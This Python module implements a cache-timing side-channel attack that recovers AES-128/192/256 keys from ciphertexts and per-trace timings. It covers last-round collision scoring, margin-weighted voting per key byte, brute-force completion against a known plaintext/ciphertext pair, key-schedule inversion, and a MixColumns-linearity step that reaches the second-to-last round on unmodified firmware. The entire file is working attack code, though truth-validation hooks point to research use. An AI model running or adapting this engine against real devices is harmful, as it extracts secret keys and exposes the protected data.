"""Unified flash-timing key-recovery engine.

One config-driven last-round cache-collision attack over:
  * direction 'enc'  -> attacker knows the AES *encrypt* output block (ciphertext
                        / CBC block / CTR keystream); predictor uses inv S-box;
                        recovers the LAST round key.
  * direction 'dec'  -> attacker knows the AES *decrypt* output block (InvCipher
                        of the ciphertext); predictor uses the forward S-box;
                        recovers the FIRST round key.
  * keysize 128/192/256 (round-key -> master via aesref.invert_key_schedule).

Robustness (the key improvement over the old per-script attacks):
  * scans all C(16,2)=120 output-byte pairs, layout-agnostic;
  * assembles each key byte by a MARGIN-WEIGHTED VOTE across all 15 pairs that
    touch it (not first-pair-wins), so one bad pair cannot corrupt a byte;
  * keeps a ranked candidate list per byte and, if a known plaintext/ciphertext
    pair is supplied, VERIFIES the assembled key and BRUTE-FORCES the few lowest-
    confidence bytes over their top candidates until it verifies -- turning the
    old 13/16 and 15/16 near-misses into exact recovery.
"""
from __future__ import annotations
from dataclasses import dataclass, field
from itertools import product
import numpy as np
from . import aesref

SBOX = aesref.SBOX.astype(np.int64)
SINV = aesref.SINV.astype(np.int64)


_BASE = np.arange(256)
_NIB_CACHE = {}

def _nib(tbl, shift=4):
    """NB[g, x] = tbl[x ^ g] >> shift, i.e. the cache-line tag of the lookup.
    shift=4 (S-box: 1-byte entries, 16/line -> top nibble); shift=2 (T-table:
    4-byte entries, 4/line -> top 6 bits). Cached per (table, shift)."""
    key = (tbl.ctypes.data, shift)
    NB = _NIB_CACHE.get(key)
    if NB is None:
        NB = (tbl[_BASE[None, :] ^ _BASE[:, None]] >> shift).astype(np.intp)  # (256 g, 256 x)
        _NIB_CACHE[key] = NB
    return NB

def col_attack_scored(ba, bb, y, tbl, line_shift=4):
    """Best (ga,gb) minimising mean time on the predicted top-nibble-collision
    set, and a margin (how far below the mean score the winner sits, in std
    units). `tbl` = SINV (enc direction) or SBOX (dec direction). Vectorised over
    the inner (gb) guess for speed."""
    ba = np.asarray(ba, np.int64); bb = np.asarray(bb, np.int64)
    Ssum = np.zeros((256, 256)); Scnt = np.zeros((256, 256))
    np.add.at(Ssum, (ba, bb), y); np.add.at(Scnt, (ba, bb), 1.0)
    NB = _nib(tbl, line_shift)                       # (256, 256)
    nbins = 1 << (8 - line_shift)                    # 16 for S-box, 64 for T-table
    scores = np.full((256, 256), np.nan)
    for ga in range(256):
        na = NB[ga]                                  # (256,) line-tag per x_a
        Rs = np.zeros((nbins, 256)); Rc = np.zeros((nbins, 256))
        np.add.at(Rs, na, Ssum)                      # sum rows into line bins -> Rs[tag, x_b]
        np.add.at(Rc, na, Scnt)
        num = Rs[NB, _BASE[None, :]].sum(axis=1)     # for every gb at once -> (256,)
        den = Rc[NB, _BASE[None, :]].sum(axis=1)
        with np.errstate(invalid="ignore", divide="ignore"):
            scores[ga] = np.where(den > 0, num / den, np.nan)
    flat = scores[np.isfinite(scores)]
    bi = int(np.nanargmin(scores)); ga, gb = divmod(bi, 256)
    margin = (flat.mean() - scores[ga, gb]) / (flat.std() + 1e-12)
    return ga, gb, float(margin)


@dataclass
class Result:
    direction: str
    keysize: int
    roundkey: bytes                      # recovered round key (last for enc, first for dec)
    which: str                           # 'last' or 'first'
    roundkey_index: int                  # global round index of the recovered key
    confidence: list                     # per-byte vote margin (0..)
    candidates: list                     # per-byte ranked list of (byteval, weight)
    master: bytes | None = None
    verified: bool | None = None
    bruteforced: list = field(default_factory=list)   # positions fixed by brute force
    truth_correct: int | None = None     # bytes matching a supplied truth (validation only)

    def summary(self):
        s = [f"{self.direction} AES-{self.keysize}: round key rk[{self.roundkey_index}] "
             f"({self.which}) = {self.roundkey.hex()}"]
        if self.master is not None:
            s.append(f"master = {self.master.hex()}  verified={self.verified}"
                     + (f"  brute-forced positions {self.bruteforced}" if self.bruteforced else ""))
        elif self.keysize != 128:
            s.append(f"(AES-{self.keysize}: master needs the last two round keys; this attack "
                     f"gives rk[{self.roundkey_index}] only -- combine with a second round key "
                     f"via master_from_results, or see docs on the second-round attack)")
        if self.truth_correct is not None:
            s.append(f"round-key bytes correct vs truth: {self.truth_correct}/16")
        return "\n".join(s)


def master_from_results(results, keysize):
    """Invert to the master key given several recover() Results whose recovered
    round keys together cover the last Nk schedule words (AES-192/256)."""
    rks = {r.roundkey_index: r.roundkey for r in results}
    return aesref.invert_from_roundkeys(rks, keysize)


def _roundkey_to_master(rkbytes, direction, keysize):
    """Assemble the master key from the recovered round key, when one round key
    is sufficient (AES-128: last key inverts, first key IS the master). For
    192/256 a single round key is not enough (needs multi-round recovery); returns
    None with which-info left to the caller."""
    if keysize == 128:
        if direction == "dec":
            return bytes(rkbytes)                    # first round key = master
        return aesref.invert_key_schedule(list(rkbytes), 128)
    return None                                      # 192/256: single round key insufficient


def recover(known_blocks, timing, *, direction="enc", keysize=128, line_shift=4,
            verify=None, cand_per_pos=4, max_bruteforce=6, truth=None, log=None):
    """Recover the key from (known block-cipher output blocks, timing).

    known_blocks : (N,16) uint8 -- the AES *output* block the attacker knows.
    timing       : (N,) float   -- per-trace timing (any monotone oracle).
    verify       : optional (pt, ct) bytes pair under the target key; enables
                   verification + brute-force of low-confidence bytes.
    truth        : optional true round key bytes, for validation only.
    """
    known = np.asarray(known_blocks, np.int64)
    y = np.asarray(timing, float); y = y - y.mean()
    tbl = SINV if direction == "enc" else SBOX

    votes = np.zeros((16, 256))
    for a in range(16):
        for b in range(a + 1, 16):
            ga, gb, mg = col_attack_scored(known[:, a], known[:, b], y, tbl, line_shift)
            if mg > 0:
                votes[a, ga] += mg
                votes[b, gb] += mg
        if log:
            log(f"  scanned pairs for byte {a}")

    order = np.argsort(-votes, axis=1)
    roundkey = bytes(int(order[i, 0]) for i in range(16))
    conf = []
    candidates = []
    for i in range(16):
        top = votes[i, order[i, 0]]; second = votes[i, order[i, 1]]
        conf.append(float(top - second))
        candidates.append([(int(order[i, j]), float(votes[i, order[i, j]])) for j in range(cand_per_pos)])

    Nr = {128: 10, 192: 12, 256: 14}[keysize]
    res = Result(direction=direction, keysize=keysize, roundkey=roundkey,
                 which=("first" if direction == "dec" else "last"),
                 roundkey_index=(0 if direction == "dec" else Nr),
                 confidence=conf, candidates=candidates)
    if truth is not None:
        res.truth_correct = sum(roundkey[i] == truth[i] for i in range(16))

    master = _roundkey_to_master(roundkey, direction, keysize)
    res.master = master

    if verify is not None and keysize == 128:
        pt = np.frombuffer(verify[0], np.uint8)[None, :]; ct = bytes(verify[1])
        def master_from(rk):
            return bytes(rk) if direction == "dec" else aesref.invert_key_schedule(list(rk), 128)
        def ok(mk):
            return aesref.encrypt_blocks(mk, np.asarray(pt))[0].tobytes() == ct
        if master is not None and ok(master):
            res.verified = True
            return res
        # Rank positions by confidence; brute-force the weakest FULL-range (0..255),
        # not just their top vote candidates (a no-signal byte may not be in them).
        weak_order = sorted(range(16), key=lambda i: conf[i])
        L = 0
        while L < min(max_bruteforce, 16) and 256 ** (L + 1) <= 256 ** 2:   # default budget: <=2 full bytes
            L += 1
        subset = weak_order[:max(L, 1)]
        found = None
        for k in range(1, len(subset) + 1):
            positions = subset[:k]
            for combo in product(range(256), repeat=k):
                rk = bytearray(roundkey)
                for pos, val in zip(positions, combo):
                    rk[pos] = val
                mk = master_from(rk)
                if ok(mk):
                    found = (mk, list(positions)); break
            if found:
                break
        if found:
            res.master = found[0]
            res.bruteforced = found[1]
            res.roundkey = bytes(aesref.key_expansion(found[0])[0] if direction == "dec"
                                 else aesref.key_expansion(found[0])[-1])
            res.verified = True
        else:
            res.verified = False
    return res


def _rk_last_from_master(master):
    return bytes(aesref.key_expansion(master)[-1])


def recover_round1_diffs(plaintext, timing, *, ref=0, line_shift=4):
    """EXPERIMENTAL / PARTIAL (see docs, "investigation of #8"). Known-plaintext-
    only path: recover round-key *differences* topbits(k0[ref] ^ k0[j]) from
    round-1 collisions, when the attacker sees inputs but not outputs.

    Limitation: only the byte pairs that are temporally adjacent in the target's
    round-1 loop actually collide, so this naive all-vs-ref form recovers only a
    subset (measured ~10/15 for a pure S-box, ~3/15 for a 4-table T-table) and
    yields differences, not absolute key bytes. Kept as a research primitive; not
    wired into attack(). A robust version would select leaking pairs by margin and
    needs an absolute anchor -- marked future.

    Round-1 lookup index = pt ^ k0, and topbits(pt^k0) = topbits(pt) ^ topbits(k0)
    (XOR is bitwise), so two positions collide iff
        topbits(pt[ref]) ^ topbits(pt[j])  ==  topbits(k0[ref] ^ k0[j]).
    Bucket by the left side; the bucket with the shortest mean time is the
    difference. `line_shift`=4 (S-box) or 2 (4-byte T-table). Returns a list of 16
    difference values (ref entry is 0); these are PARTIAL (differences, top bits
    only) -- combine with one absolute anchor for a full key."""
    pt = np.asarray(plaintext, np.int64)
    y = np.asarray(timing, float); y = y - y.mean()
    hp = pt >> line_shift
    nb = 1 << (8 - line_shift)
    diffs = [0] * 16
    for j in range(16):
        if j == ref:
            continue
        v = (hp[:, ref] ^ hp[:, j])                 # 0..nb-1 per trace
        sums = np.zeros(nb); cnt = np.zeros(nb)
        np.add.at(sums, v, y); np.add.at(cnt, v, 1.0)
        means = np.where(cnt > 0, sums / np.maximum(cnt, 1), np.inf)
        diffs[j] = int(np.argmin(means))            # topbits(k0[ref]^k0[j])
    return diffs


def recover_round1_keyspace(plaintext, timing, *, line_shift=4, conf_threshold=3.0, ref=0):
    """EXPERIMENTAL. Known-plaintext-only keyspace REDUCTION via round-1 collisions.

    Recovers the top-bit key-byte *differences* topbits(k0[a]^k0[b]) for the byte
    pairs that actually leak (selected by dip confidence), then propagates them
    from a reference byte to assign each resolved byte's top bits relative to it.
    This is the honest ceiling of a known-plaintext-only attack on this channel:
    pairwise collisions carry only top-bit differences (the cache line is 16 bytes
    -> nibble resolution for an S-box), so the low bits and one reference offset
    remain -- a keyspace reduction, not a full key. Combine with ANY output
    observation (the last-round attack) for the full key.

    Returns a dict: reldiff (topbits(k0[j]^k0[ref]) or None if unresolved),
    resolved count, per-pair confidence, and the residual-entropy estimate (bits).
    """
    pt = np.asarray(plaintext, np.int64)
    y = np.asarray(timing, float); y = y - y.mean()
    hp = pt >> line_shift
    nb = 1 << (8 - line_shift)
    top_bits = 8 - line_shift                        # bits of resolution per byte
    edges = []                                       # (conf, a, b, diff)
    for a in range(16):
        for b in range(a + 1, 16):
            v = (hp[:, a] ^ hp[:, b])
            sums = np.zeros(nb); cnt = np.zeros(nb)
            np.add.at(sums, v, y); np.add.at(cnt, v, 1.0)
            means = np.where(cnt > 0, sums / np.maximum(cnt, 1), np.nan)
            fin = means[np.isfinite(means)]
            d = int(np.nanargmin(means))
            dip = float(fin.mean() - means[d]); conf = dip / (fin.std() + 1e-9)
            edges.append((conf, a, b, d))
    edges.sort(reverse=True)
    reldiff = [None] * 16; reldiff[ref] = 0
    rconf = [None] * 16; rconf[ref] = float("inf")
    changed = True
    while changed:
        changed = False
        for conf, a, b, d in edges:
            if conf < conf_threshold:
                break
            if reldiff[a] is not None and reldiff[b] is None:
                reldiff[b] = reldiff[a] ^ d; rconf[b] = conf; changed = True
            elif reldiff[b] is not None and reldiff[a] is None:
                reldiff[a] = reldiff[b] ^ d; rconf[a] = conf; changed = True
    resolved = sum(x is not None for x in reldiff)
    max_edge = float(edges[0][0]) if edges else 0.0
    # residual entropy: unresolved bytes fully unknown (8b each); resolved bytes
    # keep their low (line_shift) bits unknown; plus the reference offset (top_bits).
    residual = (16 - resolved) * 8 + resolved * line_shift + top_bits
    return {"reldiff": reldiff, "reldiff_conf": rconf, "resolved": resolved,
            "top_bits": top_bits, "max_edge_conf": max_edge,
            "residual_entropy_bits": residual,
            "strong_edges": [e for e in edges if e[0] >= conf_threshold][:20],
            "note": "known-plaintext-only: top-bit key differences only; keyspace "
                    f"reduced 128 -> ~{residual} bits IF the edges are real. Reliable on "
                    "S-box implementations; a 4-table T-table interleaves the round-1 "
                    "lookups so few pairs truly collide (results unreliable). Add one "
                    "output observation (last-round attack) for the full key."}


# --------------------------------------------------------------------------
# Second-to-last round recovery -> full AES-192/256 master, on FULL (unmodified,
# no round-reduction) firmware, from the SAME traces. MixColumns is linear, so we
# push it onto the known peeled state and the round Nr-1 S-box/T-table lookups
# become byte-wise in a transformed key K' -- an ordinary last-round-style scan.
# --------------------------------------------------------------------------

def peel_last_round(ct, rk_last):
    """State entering the last round (= output of round Nr-1), per trace:
    a = SB^{-1}(SR^{-1}(ct ^ rk_last))."""
    ct = np.asarray(ct, np.uint8)
    v = (ct ^ np.frombuffer(bytes(rk_last), np.uint8))[:, aesref._ISR]
    return aesref.SINV[v]

def _second_round_known(a):
    """X' = SR^{-1}(MC^{-1}(a)) -- the known input for the round Nr-1 scan."""
    X = aesref._mix(a.astype(np.uint8), inv=True)          # InvMixColumns
    return X[:, aesref._ISR].astype(int)

def _roundkey_from_Kprime(Kp):
    """rk[Nr-1] = MC(SR(K'))."""
    srk = np.frombuffer(bytes(Kp), np.uint8)[aesref._SHIFT_ROWS]
    return bytes(aesref._mix(srk[None, :].copy(), inv=False)[0])

def recover_second_round(ct, timing, rk_last, *, keysize, line_shift=4, truth=None, log=None):
    """Recover rk[Nr-1] on full firmware, given ct, timing and the recovered
    last round key. `line_shift` matches round Nr-1's table (4 = S-box, 2 = 4-byte
    T-table)."""
    a = peel_last_round(ct, rk_last)
    Xp = _second_round_known(a)
    res = recover(Xp, timing, direction="enc", keysize=keysize, line_shift=line_shift, log=log)
    res.roundkey = _roundkey_from_Kprime(res.roundkey)
    res.roundkey_index = {128: 10, 192: 12, 256: 14}[keysize] - 1
    res.which = "second-to-last"
    if truth is not None:
        res.truth_correct = sum(res.roundkey[i] == truth[i] for i in range(16))
    return res


def recover_full(ct, timing, *, keysize, line_shift_last=4, line_shift_prev=4,
                 verify=None, key_for_truth=None, log=None):
    """Full AES-128/192/256 master from ct + timing on unmodified firmware.
    For 128 the last round key suffices; for 192/256 also recovers rk[Nr-1] via
    the MixColumns-linearity reduction and inverts the schedule. `verify=(pt,ct)`
    enables master verification + brute-force of low-confidence bytes."""
    Nr = {128: 10, 192: 12, 256: 14}[keysize]
    tl = bytes(aesref.key_expansion(key_for_truth)[Nr]) if key_for_truth else None
    last = recover(ct, timing, direction="enc", keysize=keysize, line_shift=line_shift_last,
                   truth=tl, log=log)
    results = [last]
    if keysize != 128:
        tp = bytes(aesref.key_expansion(key_for_truth)[Nr - 1]) if key_for_truth else None
        prev = recover_second_round(ct, timing, last.roundkey, keysize=keysize,
                                    line_shift=line_shift_prev, truth=tp, log=log)
        results.append(prev)
    try:
        master = master_from_results(results, keysize)
    except ValueError:
        master = None
    verified = None
    if verify is not None and master is not None:
        pt = np.frombuffer(verify[0], np.uint8)[None, :]
        verified = aesref.encrypt_blocks(master, pt)[0].tobytes() == bytes(verify[1])
    return {"master": master, "verified": verified, "round_keys": results,
            "correct": [r.truth_correct for r in results]}
